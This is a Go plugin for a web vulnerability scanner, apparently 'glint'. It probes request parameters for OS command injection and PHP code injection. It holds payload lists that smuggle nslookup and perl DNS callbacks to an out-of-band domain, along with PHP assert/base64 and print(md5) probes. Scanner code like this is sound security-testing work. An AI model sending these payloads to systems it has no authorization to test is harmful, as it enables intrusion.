package cmdinject

import (
	"errors"
	"fmt"
	"glint/config"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	reverse2 "glint/reverse"
	"glint/util"
	"regexp"
	"strings"
	"time"

	"github.com/thoas/go-funk"
)

// const (
// 	phpinject = "phpinjectds"
// )

var cert string
var mkey string

type CallbackCheck func(args ...interface{}) (bool, error)

var DefaultProxy = ""

var st = `<?php echo"<pre>dsadsacxz<pre>"?>`

type classWebShell struct {
	scheme layers.Scheme
	// InjectionPatterns      classInjectionPatterns
	TargetUrl            string
	inputIndex           int
	reflectionPoint      int
	disableSensorBased   bool
	currentVariation     int
	foundVulnOnVariation bool
	variations           *util.Variations
	lastJob              layers.LastJob
	VulnPayload          string
	lastJobProof         interface{}
	// injectionValidator     TInjectionValidator
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
	trueFeatures           *layers.MFeatures
	// IsSensorServerEnabled  bool
}

func (c *classWebShell) ClearFeature() {
	if c.lastJob.Features != nil {
		c.lastJob.Features.Clear()
	}
	if c.trueFeatures != nil {
		c.trueFeatures.Clear()
	}
}

func CmdValid(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var err error
	var variations *util.Variations

	var WebShell classWebShell
	//var hostid int64
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	gd := args
	// layers.Init()
	ct := layers.CheckType{}
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	WebShell.lastJob.Init(Param)
	// variations,err = util.ParseUri(url)
	// BlindSQL.variations =

	variations, err = util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	//赋值
	WebShell.variations = variations
	WebShell.lastJob.Layer.Sess = sess
	WebShell.TargetUrl = Param.Url
	WebShell.lastJob.Layer.Method = Param.Method
	WebShell.lastJob.Layer.ContentType = Param.ContentType
	WebShell.lastJob.Layer.Headers = Param.Headers
	WebShell.lastJob.Layer.Body = []byte(Param.Body)
	defer WebShell.ClearFeature()
	// sess := nenet.GetSessionByOptions(
	// 	&nenet.ReqOptions{
	// 		Timeout:       time.Duration(Param.Timeout) * time.Second,
	// 		AllowRedirect: false,
	// 		Proxy:         Param.UpProxy,
	// 		Cert:          Param.Cert,
	// 		PrivateKey:    Param.CertKey,
	// 	})

	if WebShell.startTesting() {
		detail := fmt.Sprintf("cmd inject vulnerability found. payload:%s", WebShell.VulnPayload)

		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			detail,
			[]string{string(WebShell.lastJob.Features.Request.String())},
			[]string{string(WebShell.lastJob.Features.Response.String())},
			"high",
			Param.Hostid, string(plugin.CmdInject))

		gd.Alert(Result)

		return Result, true, err
	}

	return nil, false, errors.New("cmd inject vulnerability not found")
}

func (c *classWebShell) startTesting() bool {
	c.isUnknown = true
	// rnd1 := util.RandLowLetterNumber(6)
	// rnd2 := util.RandLowLetterNumber(6)
	// regexpStr := "((" + rnd1 + "\\$\\(\\)\\\\ " + rnd2 + "\\\\nzxyu)|(" + rnd1 + "\\s" + rnd2 + "nz\\^xyu))"

	// var payload_page = []string{
	// 	`echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`&echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" &echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`|echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// 	`&&echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #' |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #|\" |echo {rnd1}$()\\ {rnd2}\\nz^xyu||a #`,
	// }

	if config.IsSensorServerEnabled {
		var domain_payload_list = []string{
			`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
			// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
			`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
			"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
			"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
			"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
		}

		flag := util.RandLowLetterNumber(10)
		reverse := reverse2.NewReverse1(config.CeyeDomain, flag)
		_reverse := reverse.(*reverse2.Reverse1)

		if c.variations != nil {
			for _, p := range c.variations.Params {
				//fmt.Println(p.Name, p.Value)
				if c.foundVulnOnVariation {
					break
				}
				for _, payload := range domain_payload_list {
					s1 := strings.ReplaceAll(payload, "{domain}", _reverse.Url)
					f, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(s1))
					if err != nil {
						return false
					}
					defer f.Clear()
					if reverse2.ReverseCheck(reverse, 2) {
						c.foundVulnOnVariation = true
						c.VulnPayload = payload
						return true
					}
				}
			}
		}
	}

	//if SensorServer has disable

	//PHP code injection
	var payloads = []string{
		`;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));`,
		`';print(md5(31337));$a='`,
		`\";print(md5(31337));$a=\"`,
		`${@print(md5(31337))}`,
		`${@print(md5(31337))}\\`,
		`'.print(md5(31337)).'`,
	}

	if c.variations != nil {
		for _, p := range c.variations.Params {
			//fmt.Println(p.Name, p.Value)
			if c.foundVulnOnVariation {
				break
			}
			for _, payload := range payloads {
				//s1 := strings.ReplaceAll(payload, "{domain}", _reverse.Url)
				report, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(payload))
				if err != nil {
					continue
				}
				defer report.Clear()
				if funk.Contains(report.Response.String(), "6f3249aa304055d63828af3bfab778f6") {
					c.VulnPayload = payload
					return true
				}
				var regexphp = `Parse error: syntax error,.*?\sin\s.*?\(\d+\).*?eval\(\)\'d\scode\son\sline\s<i>\d+<\/i>`
				re, _ := regexp.Compile(regexphp)
				result := re.FindString(report.Response.String())
				if result != "" {
					c.VulnPayload = payload
					return true
				}

				// if reverse2.ReverseCheck(reverse, 2) {
				// 	c.foundVulnOnVariation = true
				// 	return true
				// }
			}
		}
	}

	return false
}
